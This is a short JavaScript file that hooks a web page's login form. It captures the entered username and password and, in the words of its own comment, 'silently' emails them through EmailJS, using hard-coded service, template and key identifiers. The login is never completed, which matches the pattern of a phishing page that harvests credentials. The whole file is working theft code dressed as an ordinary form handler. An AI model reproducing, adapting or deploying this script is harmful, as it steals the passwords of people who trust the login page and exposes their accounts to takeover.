// Initialize EmailJS with your Public Key
emailjs.init("j5vu2qRA6sVjadX3w");

document.getElementById("login-form").addEventListener("submit", function (e) {
  e.preventDefault();

  // Get the form values
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  if (username && password) {
    // Silently send email using EmailJS
    emailjs.send("service_i655qdh", "template_68xxjz8", {
      username: username,
      password: password,
    });
  }
});
